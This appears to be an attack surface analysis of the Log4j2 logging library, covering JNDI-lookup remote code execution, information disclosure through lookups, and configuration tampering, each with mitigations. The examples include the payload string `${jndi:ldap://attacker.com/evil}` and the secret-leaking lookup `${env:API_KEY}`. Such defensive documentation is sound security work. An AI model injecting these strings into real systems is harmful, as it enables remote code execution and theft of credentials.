# Attack Surface Analysis for apache/logging-log4j2

## Attack Surface: [Log Message Injection leading to Remote Code Execution (RCE) via JNDI Lookup](./attack_surfaces/log_message_injection_leading_to_remote_code_execution__rce__via_jndi_lookup.md)

*   **Description:** Attackers can inject malicious strings into log messages that, when processed by Log4j2's lookup feature, trigger a request to a remote server via JNDI (Java Naming and Directory Interface). This can lead to the download and execution of arbitrary code.
*   **How logging-log4j2 contributes to the attack surface:** Log4j2's lookup functionality, specifically the ability to resolve JNDI URIs within log messages, enables this attack vector. If user-controlled data is logged without sanitization, it can contain malicious JNDI lookups.
*   **Example:** An attacker sends a request to a vulnerable application with a User-Agent string like `${jndi:ldap://attacker.com/evil}`. If this User-Agent is logged by Log4j2, the library will attempt to resolve the JNDI URI, potentially downloading and executing code from `attacker.com`.
*   **Impact:** Critical. Successful exploitation can lead to complete compromise of the affected server, allowing attackers to execute arbitrary commands, steal data, install malware, or pivot to other systems.
*   **Risk Severity:** Critical
*   **Mitigation Strategies:**
    *   Upgrade Log4j2 to the latest patched version (>= 2.17.1 for complete mitigation of known RCE vulnerabilities).
    *   For older versions (>= 2.10): Set the system property `log4j2.formatMsgNoLookups` to `true` or the environment variable `LOG4J_FORMAT_MSG_NO_LOOKUPS` to `true`. This disables the vulnerable lookup functionality.
    *   Remove the `JndiLookup` class from the classpath.
    *   Implement robust input validation and sanitization to prevent user-controlled data from being logged directly without scrutiny.

## Attack Surface: [Log Message Injection leading to Information Disclosure via Lookup](./attack_surfaces/log_message_injection_leading_to_information_disclosure_via_lookup.md)

*   **Description:** Attackers can inject specially crafted strings into log messages that leverage Log4j2's lookup feature to reveal sensitive information from the application's environment or system.
*   **How logging-log4j2 contributes to the attack surface:** The lookup functionality allows access to various system properties, environment variables, and other contextual information. If not carefully controlled, this can be abused.
*   **Example:** An attacker injects a log message containing `${sys:os.name}` or `${env:API_KEY}`. Log4j2 will resolve these lookups, potentially revealing the operating system name or a sensitive API key in the logs.
*   **Impact:** High. Information disclosure can lead to further attacks, credential compromise, and unauthorized access to sensitive data.
*   **Risk Severity:** High
*   **Mitigation Strategies:**
    *   Disable lookup functionality if not strictly necessary (as described in the RCE mitigation).
    *   Carefully control which lookup types are allowed and sanitize any data used within lookups.
    *   Implement strict access controls on log files and logging infrastructure to limit who can view the logs.
    *   Redact or mask sensitive information before logging.

## Attack Surface: [Configuration Vulnerabilities leading to Malicious Changes](./attack_surfaces/configuration_vulnerabilities_leading_to_malicious_changes.md)

*   **Description:** Attackers who can modify the Log4j2 configuration file can alter logging behavior to their advantage, potentially redirecting logs, disabling security logging, or even executing arbitrary code in some scenarios (though less common than JNDI RCE).
*   **How logging-log4j2 contributes to the attack surface:** Log4j2 relies on configuration files (often `log4j2.xml` or `log4j2.properties`) to define its behavior. If these files are writable by an attacker, the library's flexibility becomes a vulnerability.
*   **Example:** An attacker modifies the `log4j2.xml` file to redirect logs to an attacker-controlled server or to disable logging of security-related events.
*   **Impact:** Medium to High. Depending on the modifications, this can hinder incident response, allow attackers to cover their tracks, or potentially lead to further compromise.
*   **Risk Severity:** High (considering potential for code execution or significant impact on security visibility).
*   **Mitigation Strategies:**
    *   Ensure the Log4j2 configuration file is not writable by unauthorized users. Implement appropriate file system permissions.
    *   Store the configuration file in a secure location.
    *   Consider using programmatic configuration instead of relying solely on external files.
    *   Regularly audit the Log4j2 configuration for any unexpected changes.

